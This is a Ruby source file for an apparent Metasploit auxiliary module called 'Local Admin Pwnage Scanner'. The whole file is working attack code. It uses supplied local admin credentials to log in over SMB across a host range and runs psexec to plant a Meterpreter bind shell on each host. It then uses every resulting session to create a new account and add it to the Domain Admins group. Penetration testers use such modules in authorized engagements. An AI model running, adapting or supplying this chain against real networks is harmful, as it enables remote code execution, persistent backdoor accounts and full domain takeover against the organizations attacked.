##
# $Id: smb_version.rb 10458 2010-09-24 17:52:25Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
class Metasploit4 < Msf::Auxiliary

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize (info = {})
    super(update_info(info,
      'Name'		=> 'Local Admin Pwnage Scanner',
      'Version'	=> '$Revision$',
      'Description'	=> 'Using Local Admin credentials to try to achieve Domain Admin access. Uses windows/meterpreter/bind_tcp as a payload.',
      'Author'	=> 'Joshua Abraham <jabra[at]rapid7.com>',
      'License'	=> MSF_LICENSE))
    # These are normally advanced options, but for this module they have a
    # more active role, so make them regular options.
    register_options(
        [
        OptString.new('SMBPass', [ false, "SMB Password" ]),
        OptString.new('SMBUser', [ false, "SMB Username" ]),
        OptString.new('SMBDomain', [ false, "SMB Domain", 'WORKGROUP']),
        OptInt.new('THREADS', [ false, "Threads for (smb_login & smb_version)", 10]),
        OptString.new('PASS', [ true, "New User's Password", "" ]),
        OptString.new('USER', [ true, "New User to add to the Domain (as Domain Admin)", ""]),
        OptBool.new('VERBOSE', [ false, "Verbose Output", true]),
        ], self.class)
    deregister_options('RPORT', 'RHOST')
  end

  ## Run psexec on a given IP
  def psexec(ip)
    payload = 'windows/meterpreter/bind_tcp'
    psexec = framework.modules.create("exploit/windows/smb/psexec")
    psexec.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
    psexec.datastore['MODULE_OWNER'] = self.owner
    psexec.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    psexec.datastore['RHOST'] = ip
    psexec.datastore['SMBUser'] = datastore["SMBUser"]
    psexec.datastore['SMBPass'] = datastore["SMBPass"]
    psexec.datastore['SMBDomain'] = datastore["SMBDomain"]
    psexec.datastore['SHARE'] = 'ADMIN$'
    psexec.datastore['RPORT'] = 445
    psexec.datastore['ExitOnSession'] = false
    psexec.datastore['DisablePayloadHandler'] = false
    psexec.datastore['EXITFUNC'] = 'process'
    psexec.datastore['VERBOSE'] = true
    psexec.datastore['ForceBlocking'] = true
    psexec.exploit_simple(
      'LocalInput'	=> self.user_input,
      'LocalOutput'	=> self.user_output,
      'Payload'	=> payload,
      'Target'	=> 0,
      'ForceBlocking'	=> true,
      'RunAsJob'	=> true)
    Rex::ThreadSafe.sleep(4)
  end

  ## add user to the domain and to the domain admins group for a given session id
  def add_user_domain(sid)
    add_user_domain = framework.modules.create("post/windows/manage/add_user_domain")
       add_user_domain.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    add_user_domain.datastore['SESSION'] = sid
    add_user_domain.datastore['ADDTOGROUP'] = true
    add_user_domain.datastore['ADDTODOMAIN'] = true
    add_user_domain.datastore['PASS'] = datastore['PASS']
    add_user_domain.datastore['USER'] = datastore['USER']
    add_user_domain.datastore['TOKEN'] = ""
    add_user_domain.run_simple(
      'LocalInput'	=> self.user_input,
      'LocalOutput'	=> self.user_output,
      'RunAsJob'	=> false)
  end

  def smb_version
    smb_version = framework.modules.create("auxiliary/scanner/smb/smb_version")
    smb_version.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    smb_version.datastore['RHOSTS'] = datastore['RHOSTS']
    smb_version.datastore['THREADS'] = datastore['THREADS']
    smb_version.datastore['VERBOSE'] = datastore['VERBOSE']
    smb_version.run_simple(
      'LocalInput'	=> self.user_input,
      'LocalOutput'	=> self.user_output,
      'RunAsJob'	=> false)
  end

  def smb_login
    smb_login = framework.modules.create("auxiliary/scanner/smb/smb_login")
    smb_login.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    smb_login.datastore['RHOSTS'] = datastore['RHOSTS']
    smb_login.datastore['THREADS'] = datastore['THREADS']
    smb_login.datastore['SMBUser'] = datastore['SMBUser']
    smb_login.datastore['SMBPass'] = datastore['SMBPass']
    smb_login.datastore['SMBDomain'] = datastore['SMBDomain'] || "WORKGROUP"
    smb_login.datastore['BLANK_PASSWORDS'] = false
    smb_login.datastore['USER_AS_PASS'] = false
    smb_login.datastore['VERBOSE'] = datastore['VERBOSE']
    smb_login.run_simple(
      'LocalInput'	=> self.user_input,
      'LocalOutput'	=> self.user_output,
      'RunAsJob'	=> false)
  end

  def run
    print_status('Starting Local Admin Pwnage Scanner')

    smb_version()
    smb_login()

    range_walker = Rex::Socket::RangeWalker.new(datastore['RHOSTS'])
    range_walker.each do |ip|
      print_status("Running psexec on #{ip}")
      psexec(ip)
    end
    
    framework.sessions.each_key do |sid|
      session = framework.sessions[sid]
      next if session.type != "meterpreter"
      add_user_domain(sid)
    end
  end
end

